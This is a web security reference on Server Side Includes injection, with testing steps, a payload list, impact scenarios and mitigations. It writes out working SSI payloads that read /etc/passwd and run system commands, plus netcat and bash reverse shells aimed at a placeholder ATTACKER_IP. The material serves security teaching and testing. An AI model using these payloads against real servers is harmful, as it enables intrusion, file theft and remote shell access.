## Overview

Server Side Includes (SSI) Injection is a web security vulnerability that occurs when an application incorporates untrusted user-supplied data into Server Side Include directives without proper validation or sanitization. SSI directives are commands embedded in HTML pages that are processed by the web server before being sent to the client's browser.

SSI directives use a specific syntax with HTML comment-like tags (e.g., `<!--#directive -->`) and are commonly used for including dynamic content, executing commands, or displaying server variables. When user input is improperly handled and inserted into these directives, attackers can inject malicious SSI commands to read sensitive files, execute arbitrary commands, or gain unauthorized access to the server.

This vulnerability typically affects web servers that have SSI enabled, such as Apache with mod_include or IIS with Server Side Includes feature activated.

## Exploitation Methods

### Detection

SSI Injection vulnerabilities can be found in various locations within a web application:
- Form input fields
- GET/POST parameters
- URL parameters
- HTTP headers
- Cookie values
- File upload functionality (filename fields)

### Basic Testing Steps

1. **Identify Injection Points**: Test any user input that might be reflected in the server's response
2. **Insert Basic SSI Payload**: Start with simple directives to confirm SSI processing
3. **Verify Execution**: Check if the directive is executed rather than displayed as plain text
4. **Escalate Privileges**: Progress to more sensitive commands based on successful tests

### Exploitation Techniques

#### 1. Variable Disclosure
Print current date and time:
```html
<!--#echo var="DATE_LOCAL" -->
```

Print specific server variables:

```html
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#echo var="LAST_MODIFIED" -->
```

#### 2. Environment Variable Enumeration

Display all environment variables:

```html
<!--#printenv -->
```

#### 3. File Inclusion

Include local files:

```html
<!--#include file="includefile.html" -->
<!--#include file="/etc/passwd" -->
<!--#include file="../../../etc/passwd" -->
```

Include virtual paths:

```html
<!--#include virtual="/index.html" -->
<!--#include virtual="/etc/passwd" -->
```

#### 4. Command Execution

Execute system commands:

```html
<!--#exec cmd="ls -la" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="uname -a" -->
```

#### 5. Reverse Shell

Establish reverse shell connection:

```html
<!--#exec cmd="mkfifo /tmp/foo;nc ATTACKER_IP ATTACKER_PORT 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```

Alternative reverse shell:

```html
<!--#exec cmd="bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1" -->
```

## Payloads

### Top 10 SSI Injection Payloads

1. **Environment Variable Dump**

```html
<!--#printenv -->
```

2. **Current Date/Time**

```html
<!--#echo var="DATE_LOCAL" -->
```

3. **Document Information**

```html
<!--#echo var="DOCUMENT_URI" -->
```

4. **Read Sensitive Files**

```html
<!--#include file="/etc/passwd" -->
```

5. **Command Execution Test**

```html
<!--#exec cmd="whoami" -->
```

6. **Directory Listing**

```html
<!--#exec cmd="ls -la" -->
```

7. **System Information**

```html
<!--#exec cmd="uname -a" -->
```

8. **Network Configuration**

```html
<!--#exec cmd="ifconfig" -->
```

9. **Netcat Reverse Shell**

```html
<!--#exec cmd="mkfifo /tmp/foo;nc ATTACKER_IP ATTACKER_PORT 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```

10. **Bash Reverse Shell**

```html
<!--#exec cmd="bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1" -->
```

## Higher Impact Scenarios

### Remote Code Execution (RCE)

The most critical impact of SSI Injection is achieving remote code execution on the server. Through the `<!--#exec cmd="" -->` directive, attackers can:

- Execute arbitrary system commands
- Install backdoors or malware
- Create new user accounts
- Modify system configurations
- Pivot to internal network resources

### Sensitive Information Disclosure

Attackers can leverage SSI to access sensitive data:

- Read configuration files containing database credentials
- Access application source code
- Retrieve private keys or certificates
- Enumerate user accounts and system information
- Access log files containing sensitive data

### Server Takeover

Complete server compromise can be achieved by:

- Establishing persistent reverse shells
- Creating cron jobs for persistent access
- Modifying system files
- Disabling security controls
- Using the compromised server as a pivot point for lateral movement

### Data Exfiltration

SSI Injection can facilitate large-scale data theft:

- Extracting database contents via command execution
- Accessing and downloading sensitive files
- Monitoring user activities through log access
- Capturing credentials from memory or configuration files

## Mitigations

### Input Validation and Sanitization

- Implement strict input validation for all user-supplied data
- Use allowlists to permit only expected characters and patterns
- Reject any input containing SSI directive syntax (`<!--#`)
- Sanitize special characters before processing user input

### Disable SSI When Unnecessary

- Disable Server Side Includes if not required for application functionality
- Remove or comment out SSI modules in web server configuration
- For Apache: disable `mod_include` or use `Options -Includes`
- For IIS: disable Server Side Includes feature

### Restrict SSI Directives

- If SSI is necessary, disable dangerous directives like `exec` and `include`
- Use `Options IncludesNOEXEC` in Apache to prevent command execution
- Limit SSI processing to specific directories only

### Content Security Policies

- Implement Content Security Policy (CSP) headers to restrict script execution
- Use strict CSP directives to minimize attack surface
- Monitor and log CSP violations for security analysis

### Output Encoding

- Encode all dynamic content before rendering in HTML
- Use context-appropriate encoding (HTML, JavaScript, URL)
- Implement template engines with automatic escaping

### Web Application Firewall (WAF)

- Deploy WAF rules to detect and block SSI injection attempts
- Create custom rules to identify SSI directive patterns
- Monitor and alert on suspicious SSI-related requests

### Principle of Least Privilege

- Run web server processes with minimal required permissions
- Restrict file system access for web server user accounts
- Use chroot jails or containers to isolate web applications

### Regular Security Testing

- Conduct periodic vulnerability assessments and penetration testing
- Include SSI injection in security testing checklists
- Implement automated security scanning in CI/CD pipelines
- Monitor application logs for SSI injection attempt patterns

### Secure Development Practices

- Train developers on SSI injection risks and prevention
- Implement secure coding standards and guidelines
- Conduct code reviews with security focus
- Use static and dynamic code analysis tools

## References

- [OWASP - Server-Side Includes (SSI) Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_\(SSI\)_Injection)